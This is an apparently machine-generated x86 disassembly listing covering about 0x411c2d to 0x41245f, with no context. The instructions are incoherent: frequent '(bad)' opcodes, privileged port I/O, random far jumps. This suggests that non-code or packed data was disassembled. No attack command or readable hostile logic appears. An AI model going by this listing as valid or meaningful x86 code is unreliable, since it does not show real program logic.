  411c2d:	adc    edx,DWORD PTR [ebx+0x128484ed]
  411c33:	adc    al,0x22
  411c35:	addr16 (bad) 
  411c37:	and    BYTE PTR [ebp-0x590cbb0b],bh
  411c3d:	push   ss
  411c3e:	push   esp
  411c3f:	cli    
  411c40:	out    dx,eax
  411c41:	test   DWORD PTR [esi],ebp
  411c43:	add    cl,BYTE PTR [ebx+0x287ee6b]
  411c49:	or     eax,0x807f7f0a
  411c4e:	sub    eax,0x5277b9b7
  411c53:	dec    edx
  411c54:	mov    bl,0x1e
  411c56:	jmp    0x411cbf
  411c58:	aaa    
  411c59:	xor    BYTE PTR [esi-0x35],ch
  411c5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c5d:	cmc    
  411c5e:	mov    edi,0xd0c59dc8
  411c63:	call   0xe0415592
  411c68:	fisubr WORD PTR [esi+eiz*1]
  411c6b:	and    BYTE PTR [esi+0x50],0x5d
  411c6f:	and    BYTE PTR [ecx-0x51],dh
  411c72:	push   es
  411c73:	std    
  411c74:	jne    0x411c41
  411c76:	dec    DWORD PTR [esi-0xf5d5b61]
  411c7c:	sar    DWORD PTR [eax],cl
  411c7e:	inc    esp
  411c7f:	adc    dh,BYTE PTR [ebp-0x21]
  411c82:	dec    esi
  411c83:	mov    bh,0x80
  411c85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c86:	(bad)  
  411c87:	jmp    0x411c77
  411c89:	adc    bl,al
  411c8b:	and    DWORD PTR [edi+0xe],ebp
  411c8e:	sub    al,0x82
  411c90:	adc    DWORD PTR [eax-0x80],ebx
  411c93:	add    BYTE PTR ds:0x378c33eb,bl
  411c99:	adc    dh,ah
  411c9b:	bound  esp,QWORD PTR [ebp+0x58]
  411c9e:	dec    bh
  411ca0:	pop    edi
  411ca1:	daa    
  411ca2:	shl    dh,cl
  411ca4:	test   eax,0xe4bcd820
  411ca9:	jecxz  0x411c6d
  411cab:	(bad)  
  411cac:	in     al,dx
  411cad:	out    0x2e,al
  411caf:	aas    
  411cb0:	dec    eax
  411cb1:	or     al,0xa4
  411cb3:	retf   
  411cb4:	cmp    DWORD PTR [ebx],eax
  411cb6:	and    eax,0xa720082e
  411cbb:	inc    ebp
  411cbc:	pop    ss
  411cbd:	pusha  
  411cbe:	sub    BYTE PTR [eax-0x7e9b879f],dl
  411cc4:	fistp  DWORD PTR ds:0xdfc1fca6
  411cca:	adc    esp,DWORD PTR [ebp-0x6ed1de9c]
  411cd0:	aam    0xbc
  411cd2:	or     al,0x1
  411cd4:	lahf   
  411cd5:	test   BYTE PTR [esi-0x39],0x37
  411cd9:	sar    DWORD PTR [eax+0x4d102a3],cl
  411cdf:	mov    ebp,0xfec54722
  411ce4:	mov    edi,0x3ed056b0
  411ce9:	xor    eax,0x9a561b5e
  411cee:	xchg   BYTE PTR ds:0x563ebc32,dl
  411cf4:	ja     0x411d21
  411cf6:	loop   0x411d14
  411cf8:	push   0xde693a32
  411cfd:	jae    0x411d32
  411cff:	icebp  
  411d00:	pop    eax
  411d01:	aas    
  411d02:	and    al,BYTE PTR [eax+0x1ba56887]
  411d08:	repz xor BYTE PTR [ebx+0x7b10b16d],ah
  411d0f:	out    0xbd,al
  411d11:	in     eax,0x80
  411d13:	aas    
  411d14:	mov    ebx,0xc6ec2d1f
  411d19:	loopne 0x411d45
  411d1b:	ficom  WORD PTR [edi+ebx*4+0x8b1355f]
  411d22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d23:	cs stc 
  411d25:	std    
  411d26:	sar    bh,0x3e
  411d29:	push   esi
  411d2a:	adc    al,0xda
  411d2c:	sbb    eax,0xdf1afe08
  411d31:	mov    edi,0x52f22920
  411d36:	test   BYTE PTR [ebx+0x194af50e],0x81
  411d3d:	xchg   ebx,eax
  411d3e:	shr    BYTE PTR ds:[ebp-0x43],1
  411d42:	cmp    al,0x60
  411d44:	push   cs
  411d45:	mov    BYTE PTR [edi-0x7c4512be],bh
  411d4b:	addr16 repz call ecx
  411d4f:	inc    ebp
  411d50:	sbb    al,0x82
  411d52:	inc    esp
  411d53:	call   0xcf7406df
  411d58:	xor    BYTE PTR [edi+0x6f],dh
  411d5b:	inc    esp
  411d5c:	es or  bl,al
  411d5f:	gs loop 0x411d9f
  411d62:	push   esi
  411d63:	mov    DWORD PTR [ebx],edi
  411d65:	ins    DWORD PTR es:[edi],dx
  411d66:	ss adc eax,0x355d2e11
  411d6c:	out    0x89,eax
  411d6e:	pop    ecx
  411d6f:	iret   
  411d70:	sbb    BYTE PTR [ebx+ecx*4],0x22
  411d74:	les    esp,FWORD PTR [esi]
  411d76:	hlt    
  411d77:	pop    esi
  411d78:	adc    eax,0x8646e604
  411d7d:	xor    BYTE PTR [ebx+0x14bd9f5e],cl
  411d83:	or     bh,BYTE PTR [edx]
  411d85:	push   ebp
  411d86:	int3   
  411d87:	test   BYTE PTR [esi-0x7d],dh
  411d8a:	rcl    DWORD PTR [ecx-0x15b4458f],cl
  411d90:	(bad)  
  411d92:	mov    esi,0xe08f5608
  411d97:	adc    eax,0x906b9b19
  411d9c:	xchg   ebx,eax
  411d9d:	xor    cl,BYTE PTR [ebx-0x38]
  411da0:	mov    eax,ds:0x60006f9b
  411da5:	out    dx,al
  411da6:	daa    
  411da7:	mov    edx,DWORD PTR [eax]
  411da9:	pop    eax
  411daa:	sti    
  411dab:	xchg   esi,eax
  411dac:	adc    eax,0x695cabdb
  411db1:	call   0x1365:0x753ccd7f
  411db8:	(bad)  
  411db9:	mov    eax,0x457910ba
  411dbe:	loopne 0x411dfb
  411dc0:	aaa    
  411dc1:	adc    eax,0x10f8f7aa
  411dc6:	(bad)  
  411dc7:	jl     0x411db0
  411dc9:	fnsave [ebx-0x2caa1c3]
  411dcf:	dec    BYTE PTR [esi+eax*1+0x727d9dad]
  411dd6:	and    edx,DWORD PTR [ebp-0x51]
  411dd9:	or     eax,0x93a6d879
  411dde:	mov    ecx,0x7a41215c
  411de3:	add    BYTE PTR [eax-0x73dd13fd],0x6f
  411dea:	sti    
  411deb:	and    bh,bh
  411ded:	sub    al,0xec
  411def:	les    edi,FWORD PTR [ebx]
  411df1:	into   
  411df2:	mov    ds:0x5d176789,eax
  411df7:	sub    DWORD PTR [ebx-0x1abdda10],ecx
  411dfd:	mov    ebp,DWORD PTR [edi-0x29]
  411e00:	aaa    
  411e01:	xchg   esi,eax
  411e02:	das    
  411e03:	pop    edi
  411e04:	xor    eax,0x2c47ba73
  411e09:	in     eax,0x7a
  411e0b:	(bad)  
  411e0c:	std    
  411e0d:	je     0x411dd8
  411e0f:	pop    eax
  411e10:	call   0x9c5:0x14ae2d71
  411e17:	idiv   BYTE PTR [ebp-0x6e01d342]
  411e1d:	mov    ecx,0xa0081960
  411e22:	dec    ecx
  411e23:	loope  0x411dcc
  411e25:	dec    ebx
  411e26:	cmp    al,bh
  411e28:	sar    BYTE PTR [ebx],cl
  411e2a:	xor    ebx,edx
  411e2c:	inc    edi
  411e2d:	dec    ebp
  411e2e:	ficomp DWORD PTR [esi-0x148b537f]
  411e34:	cmc    
  411e35:	inc    ebx
  411e36:	sub    eax,0xa3e0dc08
  411e3b:	xor    DWORD PTR [ebx+0x76b86ce7],esi
  411e41:	es mov esi,0xbcbc42ca
  411e47:	(bad)  
  411e48:	push   ds
  411e49:	test   bl,dl
  411e4b:	xchg   ecx,eax
  411e4c:	dec    esi
  411e4d:	sbb    ecx,DWORD PTR [eax+edx*4-0x1d]
  411e51:	xchg   edi,eax
  411e52:	mov    WORD PTR [ebx],?
  411e54:	jge    0x411e25
  411e56:	mov    WORD PTR [edx],?
  411e58:	xor    eax,0xa709e41c
  411e5d:	cli    
  411e5e:	mov    edx,0x4f148f5e
  411e63:	ret    0x7810
  411e66:	imul   edx,edx,0x64
  411e69:	xor    cl,BYTE PTR [esi*8-0x3101bf58]
  411e70:	inc    ebp
  411e71:	xlat   BYTE PTR ds:[ebx]
  411e72:	pop    edx
  411e73:	xor    eax,DWORD PTR [ebp+0x44]
  411e76:	push   eax
  411e77:	push   ss
  411e78:	dec    esp
  411e79:	pop    ebp
  411e7a:	inc    ecx
  411e7b:	jp     0x411e1f
  411e7d:	test   al,0x29
  411e7f:	lods   al,BYTE PTR ds:[esi]
  411e80:	mov    ecx,0xfe281001
  411e85:	mov    ds:0xd540e435,eax
  411e8a:	mov    ebp,0x8cbf57a9
  411e8f:	mov    ah,0xa5
  411e91:	scas   eax,DWORD PTR es:[edi]
  411e92:	lea    ebp,[ebx+0x5be75207]
  411e98:	pop    ebp
  411e99:	adc    dh,BYTE PTR [ebx+0x3200b567]
  411e9f:	imul   edx,DWORD PTR [eax+edx*1],0x26
  411ea3:	jnp    0x411e6c
  411ea5:	mov    ah,0xc9
  411ea7:	jb     0x411ebb
  411ea9:	and    BYTE PTR [ecx+0x7b6217fa],ch
  411eaf:	pop    ebp
  411eb0:	fadd   QWORD PTR [edx+0x5b]
  411eb3:	xchg   ebp,eax
  411eb4:	shl    ch,cl
  411eb6:	in     al,dx
  411eb7:	inc    eax
  411eb8:	retf   
  411eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eba:	fwait
  411ebb:	pop    eax
  411ebc:	fisttp WORD PTR [esp+eax*2+0x61]
  411ec0:	icebp  
  411ec1:	push   esi
  411ec2:	outs   dx,BYTE PTR ds:[esi]
  411ec3:	ror    DWORD PTR [edi+0x2],1
  411ec6:	mov    ss,WORD PTR [edx-0x3a]
  411ec9:	fld    TBYTE PTR [edx+0x42a7a984]
  411ecf:	in     al,0x74
  411ed1:	arpl   bx,si
  411ed3:	mov    bl,0x55
  411ed5:	push   esp
  411ed6:	jl     0x411f47
  411ed8:	push   ecx
  411ed9:	push   edx
  411eda:	call   0xa2994c7b
  411edf:	inc    ecx
  411ee0:	imul   esp,DWORD PTR [edx+ecx*2],0x18
  411ee4:	pop    ecx
  411ee5:	(bad)  
  411ee6:	cmp    DWORD PTR [edx-0x28d2a625],edx
  411eec:	data16 int 0x9c
  411eef:	(bad)  
  411ef0:	pop    eax
  411ef1:	ins    BYTE PTR es:[edi],dx
  411ef2:	pop    ebx
  411ef3:	jne    0x411f26
  411ef5:	(bad)  
  411ef6:	out    0x6e,al
  411ef8:	sub    cl,BYTE PTR [ebp-0x42]
  411efb:	mov    al,0xf0
  411efd:	jne    0x411ecd
  411eff:	retf   0x5ce8
  411f02:	xor    ah,dh
  411f04:	jle    0x411f14
  411f06:	lahf   
  411f07:	gs mov esi,0x7d19f777
  411f0d:	jle    0x411f17
  411f0f:	rep stos DWORD PTR es:[edi],eax
  411f11:	mov    ds:0x703221be,eax
  411f16:	or     eax,0xd5277f76
  411f1b:	ret    
  411f1c:	(bad)
  411f20:	setp   BYTE PTR [eax]
  411f23:	pop    eax
  411f24:	fcmovnbe st,st(4)
  411f26:	pop    esi
  411f27:	loop   0x411f5b
  411f29:	gs cld 
  411f2b:	jmp    0x371a:0x294311ca
  411f32:	shl    DWORD PTR [ecx+0x6487354a],cl
  411f38:	sub    ch,BYTE PTR [eax+0x2ab4bef1]
  411f3e:	test   eax,0x53f4de3f
  411f43:	xchg   edx,eax
  411f44:	jge    0x411f67
  411f46:	sub    eax,0xdf3845a4
  411f4b:	mov    edx,0x8d3edbb7
  411f50:	out    dx,al
  411f51:	sub    al,BYTE PTR [ebp-0x18]
  411f54:	ja     0x411f70
  411f56:	test   eax,0xdb58b1b8
  411f5b:	inc    ebx
  411f5c:	(bad)  
  411f5d:	mov    ds:0x85a3fdfe,al
  411f62:	mov    edx,0x6e13b111
  411f67:	setp   BYTE PTR [edx+eiz*4+0x58]
  411f6c:	sbb    al,0x57
  411f6e:	mov    ds:0x37e71d00,al
  411f73:	out    dx,eax
  411f74:	push   ds
  411f75:	mov    ecx,0x305d2c21
  411f7a:	push   es
  411f7b:	push   eax
  411f7c:	out    0xec,al
  411f7e:	stc    
  411f7f:	sbb    ah,ch
  411f81:	cli    
  411f82:	mov    ah,0x7a
  411f84:	lock mov bh,0x6f
  411f87:	jb     0x411fa8
  411f89:	mov    dh,0xf9
  411f8b:	aas    
  411f8c:	mov    ds:0xbc326cad,eax
  411f91:	xor    eax,0x9339a2a2
  411f96:	dec    edi
  411f97:	sbb    BYTE PTR [ecx],bh
  411f99:	xlat   BYTE PTR ds:[ebx]
  411f9a:	retf   0x3ce0
  411f9d:	jp     0x411f63
  411f9f:	aas    
  411fa0:	mov    ebx,0xf303fc58
  411fa5:	sbb    ch,dl
  411fa7:	push   esp
  411fa8:	pop    eax
  411fa9:	jnp    0x411fb6
  411fab:	rol    BYTE PTR [esi+0x18],0x65
  411faf:	xchg   edi,eax
  411fb0:	repz lock cmp ebp,ebp
  411fb4:	popa   
  411fb5:	das    
  411fb6:	sbb    eax,0xd73196c2
  411fbb:	cmc    
  411fbc:	shl    edx,1
  411fbe:	jecxz  0x411f63
  411fc0:	xchg   edx,eax
  411fc1:	scas   al,BYTE PTR es:[edi]
  411fc2:	je     0x411f97
  411fc4:	dec    edi
  411fc5:	pusha  
  411fc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fc7:	mov    al,0x72
  411fc9:	push   ss
  411fca:	or     bh,BYTE PTR [eax+0x4b898dae]
  411fd0:	push   ebx
  411fd1:	jb     0x411fc6
  411fd3:	cmp    eax,0xf6182055
  411fd8:	loop   0x412056
  411fda:	inc    esp
  411fdb:	out    dx,eax
  411fdc:	lock xor ah,BYTE PTR [eax-0x9]
  411fe0:	sti    
  411fe1:	mov    ebp,0x25876ef3
  411fe6:	addr16 mov ds:0x8c16,al
  411fea:	popf   
  411feb:	ss push 0xae1c3c01
  411ff1:	mov    edi,0xabdb849a
  411ff6:	fidiv  DWORD PTR [edx+eiz*2-0x40e4ecb6]
  411ffd:	and    dl,dh
  411fff:	xor    al,0x9c
  412001:	int    0x22
  412003:	push   0x1f
  412005:	mov    dh,0xa7
  412007:	inc    edi
  412008:	aas    
  412009:	js     0x411fb5
  41200b:	mov    WORD PTR [ecx+edi*1+0x286bfc7d],?
  412012:	arpl   sp,bx
  412014:	xchg   BYTE PTR [ebx+eax*4+0xb600996],ah
  41201b:	xchg   edx,eax
  41201c:	xor    ah,BYTE PTR [ebp-0x1f]
  41201f:	fnstcw WORD PTR [edi-0x6a]
  412022:	push   edi
  412023:	in     eax,dx
  412024:	(bad)  
  412026:	jae    0x412034
  412028:	push   ebx
  412029:	xor    cl,BYTE PTR [ecx+0x55444d4c]
  41202f:	inc    edi
  412030:	xor    dl,BYTE PTR [edx+eax*1+0x3897edb4]
  412037:	(bad)  
  412038:	pop    ds
  412039:	fdiv   QWORD PTR [eax]
  41203b:	sub    al,0xda
  41203d:	mov    cl,BYTE PTR [ebx-0x44]
  412040:	cmp    DWORD PTR [edx+0x6294a31b],ebx
  412046:	bound  edi,QWORD PTR [ecx-0x15]
  412049:	sub    dh,BYTE PTR [ecx]
  41204b:	daa    
  41204c:	mov    ds:0x71235ac6,eax
  412051:	ret    0xf4be
  412054:	test   BYTE PTR [eax-0x17],0xfa
  412058:	sub    edx,DWORD PTR [esi-0x5969383f]
  41205e:	mov    gs:0xc0bc010c,eax
  412064:	addr16 dec eax
  412066:	(bad)  
  412067:	retf   0xa2f0
  41206a:	mov    eax,ds:0x17ff233a
  41206f:	and    eax,0x85bb0190
  412074:	adc    BYTE PTR [esi-0x80],ch
  412077:	ror    BYTE PTR [ebp+0x39],0xb8
  41207b:	retf   0xeac
  41207e:	sbb    BYTE PTR [ebp+esi*4+0x6f309573],cl
  412085:	xchg   edx,eax
  412086:	mov    edx,0x8ce9c409
  41208b:	pop    es
  41208c:	inc    esi
  41208d:	mov    ds:0x666173e7,al
  412092:	pop    esi
  412093:	repnz ss dec esi
  412096:	int3   
  412097:	fild   DWORD PTR [eax]
  412099:	mov    dl,0xf6
  41209b:	cli    
  41209c:	mov    bh,0x60
  41209e:	lock lods al,BYTE PTR ds:[esi]
  4120a0:	inc    ebp
  4120a1:	imul   ecx,DWORD PTR [ebx-0x4e],0x54
  4120a5:	out    dx,al
  4120a6:	mov    al,ds:0xa5ca01fc
  4120ab:	cmp    eax,0x20ddba33
  4120b0:	pop    edx
  4120b1:	(bad)  
  4120b2:	test   BYTE PTR [eax],0x9f
  4120b5:	repnz mov dh,0x9
  4120b8:	xchg   bl,bl
  4120ba:	stos   BYTE PTR es:[edi],al
  4120bb:	pop    esp
  4120bc:	jae    0x4120bc
  4120be:	cld    
  4120bf:	pop    ecx
  4120c0:	test   eax,0x3e51c689
  4120c5:	sub    al,0xf2
  4120c7:	jl     0x41211c
  4120c9:	sub    DWORD PTR ds:0xcc6bdfa4,0x2bfcc3b3
  4120d3:	sbb    bh,BYTE PTR [ecx-0x198a08b9]
  4120d9:	mov    WORD PTR [ebx-0x744eccbb],gs
  4120df:	jne    0x41212d
  4120e1:	mov    dh,0x4a
  4120e3:	jnp    0x412146
  4120e5:	dec    ebx
  4120e6:	sbb    al,0x49
  4120e8:	sbb    al,BYTE PTR [esp+edx*2-0x58a53a8f]
  4120ef:	sub    eax,0x382fb09f
  4120f4:	push   edi
  4120f5:	and    eax,0x80668ab7
  4120fa:	pop    edx
  4120fb:	xchg   edx,eax
  4120fc:	lea    eax,[ebx+0x14]
  4120ff:	es pusha 
  412101:	dec    BYTE PTR [esi]
  412103:	jmp    0x67c4:0x3738834
  41210a:	mov    ah,0x8d
  41210c:	xor    cl,BYTE PTR ds:[edx]
  41210f:	retf   0x46eb
  412112:	inc    esi
  412113:	jle    0x412155
  412115:	out    dx,eax
  412116:	adc    BYTE PTR [esi],dh
  412118:	fistp  DWORD PTR [edi+ebp*8+0x184c35be]
  41211f:	int3   
  412120:	push   es
  412121:	and    eax,0xb75c5036
  412126:	lods   eax,DWORD PTR ds:[esi]
  412127:	or     esp,esp
  412129:	std    
  41212a:	cmp    BYTE PTR [edi-0x1c],al
  41212d:	mov    al,ds:0xb105aa78
  412132:	mov    ecx,0x73491660
  412137:	push   edx
  412138:	test   BYTE PTR [ebx],ah
  41213a:	jge    0x412180
  41213c:	stos   DWORD PTR es:[edi],eax
  41213d:	int    0xb9
  41213f:	mov    eax,DWORD PTR [edx-0x76]
  412142:	in     al,0x28
  412144:	pop    esp
  412145:	adc    cl,0xcc
  412148:	std    
  412149:	imul   ebp,ecx,0xffffff81
  41214c:	mov    dh,0xb3
  41214e:	mov    WORD PTR [edi+0x1],es
  412151:	adc    eax,0xc169cf7e
  412156:	stos   BYTE PTR es:[edi],al
  412157:	jns    0x412119
  412159:	(bad)  
  41215a:	fld    DWORD PTR [edi-0x5325a06f]
  412160:	adc    DWORD PTR [ecx],0xffffffaa
  412163:	popfw  
  412165:	sub    eax,DWORD PTR [ecx+0x1b31d69c]
  41216b:	add    BYTE PTR [ebx],0x9d
  41216e:	je     0x412161
  412170:	(bad)  ds:0xaa5c742e
  412176:	mov    dh,0x46
  412178:	cmp    BYTE PTR [edi+0x56],0xd3
  41217c:	add    ch,BYTE PTR ds:[esi+0x229b30fc]
  412183:	xor    al,0x69
  412185:	jle    0x4121dc
  412187:	pop    esp
  412188:	mov    cl,0xe6
  41218a:	jbe    0x41211b
  41218c:	and    DWORD PTR [edi-0x5de50976],ecx
  412192:	cli    
  412193:	pusha  
  412194:	out    0x74,eax
  412196:	inc    eax
  412197:	bound  eax,QWORD PTR [eax+0x47929200]
  41219d:	mov    bl,0x9a
  41219f:	out    dx,al
  4121a0:	test   BYTE PTR [ebp-0xe2b0e07],ah
  4121a6:	jo     0x4121ea
  4121a8:	jo     0x412212
  4121aa:	cmp    eax,DWORD PTR [ecx]
  4121ac:	cmp    esp,DWORD PTR [edx+0x61]
  4121af:	dec    ecx
  4121b0:	fsubr  st,st(0)
  4121b2:	inc    esi
  4121b3:	pop    ebx
  4121b4:	daa    
  4121b5:	rdtsc  
  4121b7:	push   ss
  4121b8:	scas   eax,DWORD PTR es:[edi]
  4121b9:	rcr    ebx,cl
  4121bb:	pop    esp
  4121bc:	inc    ecx
  4121bd:	retf   0xef2b
  4121c0:	cmp    eax,0x75ff807b
  4121c5:	push   esi
  4121c6:	mov    eax,ecx
  4121c8:	int    0x47
  4121ca:	jns    0x412197
  4121cc:	pop    esp
  4121cd:	mov    edi,0x4d772586
  4121d2:	repnz enter 0xf7a8,0x2
  4121d7:	mov    ch,BYTE PTR [esi]
  4121d9:	fiadd  DWORD PTR [ecx]
  4121db:	jg     0x4121d6
  4121dd:	mov    bl,0x90
  4121df:	dec    ebp
  4121e0:	shl    BYTE PTR [edi+0x67],0x5f
  4121e4:	xor    al,0xd2
  4121e6:	mov    al,ds:0xd5b45884
  4121eb:	push   ebp
  4121ec:	aam    0x69
  4121ee:	ds jecxz 0x41217f
  4121f1:	loopne 0x412214
  4121f3:	jle    0x412201
  4121f5:	mov    eax,ds:0x5709c7f1
  4121fa:	mov    edx,ebp
  4121fc:	ds scas al,BYTE PTR es:[edi]
  4121fe:	mov    BYTE PTR [esi+0x54e8f073],ah
  412204:	shl    BYTE PTR [eax-0x417817e0],0x9b
  41220b:	nop
  41220c:	xor    bh,ah
  41220e:	mov    edx,0x46876862
  412213:	ja     0x4121d2
  412215:	mov    dh,0x11
  412217:	push   esp
  412218:	jge    0x4121f4
  41221a:	add    dl,BYTE PTR [esi-0x42c99194]
  412220:	sbb    DWORD PTR [edi],0xffffff9c
  412223:	pop    esp
  412224:	sub    al,0xe1
  412226:	mov    ebp,0x27fff5d6
  41222b:	scas   eax,DWORD PTR es:[edi]
  41222c:	sbb    BYTE PTR [edi],ah
  41222e:	pop    ds
  41222f:	enter  0xec2c,0x24
  412233:	xor    DWORD PTR [ecx-0x4af5e0f7],ebp
  412239:	pop    ss
  41223a:	aas    
  41223b:	mov    ah,0x8c
  41223d:	adc    eax,0x252569bd
  412242:	or     al,0xa5
  412244:	mov    ebp,DWORD PTR [ebx+0x11cc1dab]
  41224a:	int    0x70
  41224c:	into   
  41224d:	adc    DWORD PTR [edx+0x34],eax
  412250:	adc    eax,0x197cfddf
  412255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412256:	inc    ecx
  412257:	ss jge 0x4122d5
  41225a:	cmp    eax,0x5e3d0b52
  41225f:	push   eax
  412260:	mov    bl,0x2e
  412262:	fsub   DWORD PTR [esp+esi*2]
  412265:	mov    bl,0x1a
  412267:	(bad)  
  412268:	adc    BYTE PTR [ecx-0x791a1b0f],ah
  41226e:	adc    dh,dh
  412270:	mov    esi,0xa5244e72
  412275:	dec    ebp
  412276:	xlat   BYTE PTR ds:[ebx]
  412277:	mov    cl,0xd4
  412279:	mov    DWORD PTR [esi],ebx
  41227b:	jg     0x412271
  41227d:	lock loop 0x412243
  412280:	add    esi,DWORD PTR [edx+0x52]
  412283:	pop    edx
  412284:	cld    
  412285:	mov    al,ds:0x7304565
  41228a:	and    BYTE PTR [edi+0x4c71402b],bl
  412290:	js     0x4122ed
  412292:	sub    eax,0x66d0b81c
  412297:	std    
  412298:	mov    WORD PTR ds:0xd0b10d5e,ds
  41229e:	jl     0x412227
  4122a0:	adc    eax,esp
  4122a2:	xor    edx,DWORD PTR [esi-0x2c]
  4122a5:	push   ebp
  4122a6:	or     ah,bl
  4122a8:	leave  
  4122a9:	aam    0xe3
  4122ab:	jl     0x412261
  4122ad:	inc    ebx
  4122ae:	sub    eax,0x171a57d1
  4122b3:	jne    0x4122cc
  4122b5:	mov    eax,ds:0x1786bd40
  4122ba:	mov    al,0x46
  4122bc:	or     DWORD PTR [eax+0x1],eax
  4122bf:	call   0x80ca:0x8bdf81c3
  4122c6:	jmp    0xdd8:0x2d53965
  4122cd:	stc    
  4122ce:	mov    al,0x18
  4122d0:	fs rol BYTE PTR gs:[eax],cl
  4122d4:	push   ds
  4122d5:	(bad)  
  4122d6:	not    BYTE PTR [esi-0x5a]
  4122d9:	jbe    0x4122e2
  4122db:	and    BYTE PTR [ebx-0x58],ah
  4122de:	pop    esp
  4122df:	jl     0x412300
  4122e1:	inc    edx
  4122e2:	inc    edx
  4122e3:	dec    edx
  4122e4:	cmp    ch,BYTE PTR [esi]
  4122e6:	in     eax,0x32
  4122e8:	mov    edx,0xfd215ee7
  4122ed:	lock mov dl,0x92
  4122f0:	push   0x5563d9f7
  4122f5:	mov    edx,eax
  4122f7:	adc    al,0xe7
  4122f9:	mov    WORD PTR ds:0x8001ab8f,cs
  4122ff:	dec    edx
  412300:	mov    eax,0xf3519045
  412305:	push   esi
  412306:	fisubr WORD PTR [eax-0x24]
  412309:	cli    
  41230a:	dec    eax
  41230b:	jecxz  0x4122f3
  41230d:	outs   dx,BYTE PTR ds:[esi]
  41230e:	fisubr WORD PTR [ebp-0x5b0619b7]
  412314:	xor    al,0xc9
  412316:	aam    0x1
  412318:	push   ds
  412319:	test   DWORD PTR [esi],edx
  41231b:	pusha  
  41231c:	pop    ebp
  41231d:	icebp  
  41231e:	das    
  41231f:	xchg   esp,eax
  412320:	mov    ah,0x9e
  412322:	popa   
  412323:	test   cl,0x95
  412326:	inc    ebp
  412327:	mov    ds:0x3acd42,eax
  41232c:	jb     0x4123a0
  41232e:	clc    
  41232f:	mov    ss,WORD PTR [edi-0x39d8220a]
  412335:	xchg   ebp,eax
  412336:	iret   
  412337:	push   es
  412338:	push   edi
  412339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41233a:	sbb    al,0x54
  41233c:	hlt    
  41233d:	scas   al,BYTE PTR es:[edi]
  41233e:	jns    0x4122f4
  412340:	pushf  
  412341:	or     DWORD PTR [edi+0x63cb615c],esi
  412347:	jp     0x4123a1
  412349:	push   ebp
  41234a:	push   cs
  41234b:	xor    bl,BYTE PTR [ecx]
  41234d:	pop    eax
  41234e:	rcr    DWORD PTR [ebx],cl
  412350:	inc    esi
  412351:	jae    0x412366
  412353:	imul   DWORD PTR [ebp+0x1f156d11]
  412359:	loopne 0x4123a9
  41235b:	outs   dx,DWORD PTR ds:[esi]
  41235c:	sub    BYTE PTR [edi+0x60],al
  41235f:	repz push ss
  412361:	std    
  412362:	retf   0xfa
  412365:	dec    edi
  412366:	mov    ds:0x6b00795d,eax
  41236b:	pushf  
  41236c:	inc    eax
  41236d:	jns    0x412387
  41236f:	adc    esi,esi
  412371:	mov    dh,0x5d
  412373:	dec    eax
  412374:	xchg   DWORD PTR [ecx-0x4d],esp
  412377:	stc    
  412378:	mov    ebx,0xcb1a5a76
  41237d:	cmp    al,0x30
  41237f:	(bad)  
  412380:	cld    
  412381:	sbb    al,0xb1
  412384:	cmp    ebp,esi
  412386:	sub    bl,BYTE PTR [ebp-0x20d5fb86]
  41238c:	cs in  eax,0xd7
  41238f:	and    al,0x24
  412391:	sbb    esp,DWORD PTR [ecx+0x48]
  412394:	adc    al,0x1e
  412396:	push   es
  412397:	push   ecx
  412398:	into   
  412399:	mov    ebx,0x4798dc9d
  41239e:	mov    ebp,0x4908bf50
  4123a3:	scas   eax,DWORD PTR es:[edi]
  4123a4:	mov    esi,0xc2f588ce
  4123a9:	jns    0x412416
  4123ab:	xchg   edi,eax
  4123ac:	call   0x86a3c545
  4123b1:	cld    
  4123b2:	cmc    
  4123b3:	fmul   DWORD PTR [ebx-0x5d7f060a]
  4123b9:	pop    ds
  4123ba:	into   
  4123bb:	mov    DWORD PTR [edx-0x66a09d82],esp
  4123c1:	push   ss
  4123c2:	fistp  WORD PTR [ebp+eiz*1+0x29d32193]
  4123c9:	lock inc esp
  4123cb:	mov    ch,dh
  4123cd:	push   ecx
  4123ce:	outs   dx,BYTE PTR ds:[esi]
  4123cf:	inc    ecx
  4123d0:	xor    dh,BYTE PTR [edi+ebp*1+0x35b17490]
  4123d7:	call   0x5a10:0x25b52258
  4123de:	push   ebx
  4123df:	loop   0x412377
  4123e1:	pop    ecx
  4123e2:	push   eax
  4123e3:	enter  0xddbe,0x53
  4123e7:	mov    eax,0x5f6ffdb5
  4123ec:	sub    ebx,DWORD PTR [edx]
  4123ee:	stc    
  4123ef:	std    
  4123f0:	jp     0x4123cd
  4123f2:	inc    esp
  4123f3:	mov    al,0xd1
  4123f5:	cmp    DWORD PTR [esi],0xffffff83
  4123f8:	push   ss
  4123f9:	pop    esi
  4123fa:	jne    0x4123ec
  4123fc:	leave  
  4123fd:	popa   
  4123fe:	or     DWORD PTR [ebp-0x4ca56178],esp
  412404:	popf   
  412405:	aas    
  412406:	pop    ss
  412407:	pop    esi
  412408:	clc    
  412409:	inc    ebp
  41240a:	les    edx,FWORD PTR [edx-0x70]
  41240d:	hlt    
  41240e:	lods   eax,DWORD PTR ds:[esi]
  41240f:	add    edi,DWORD PTR [ecx-0x44]
  412412:	ja     0x412493
  412414:	pop    esp
  412415:	dec    ebp
  412416:	mov    edx,0x941a7b20
  41241b:	cmp    DWORD PTR [eax+ecx*4],edi
  41241e:	pop    edi
  41241f:	xor    edi,esi
  412421:	es es in al,dx
  412424:	mov    esi,fs
  412426:	xchg   esp,eax
  412427:	nop
  412428:	sahf   
  412429:	sti    
  41242a:	int3   
  41242b:	sahf   
  41242c:	lods   eax,DWORD PTR ds:[esi]
  41242d:	ds xchg esp,eax
  41242f:	or     bh,BYTE PTR [eax]
  412431:	arpl   WORD PTR [ebx],ax
  412433:	aam    0x60
  412435:	(bad)  
  412436:	pop    ebx
  412437:	push   esp
  412438:	loop   0x412417
  41243a:	daa    
  41243b:	retf   0x21ac
  41243e:	and    DWORD PTR [eax+eax*8-0x780ec710],edi
  412445:	fwait
  412446:	outs   dx,BYTE PTR ds:[esi]
  412447:	je     0x412485
  412449:	ss es pop ebx
  41244c:	fistp  DWORD PTR [eax+0x4]
  412450:	fld    TBYTE PTR [ebx-0x6bb761c5]
  412456:	jmp    0xbaf2:0x57666506
  41245d:	inc    edx
  41245f:	das    
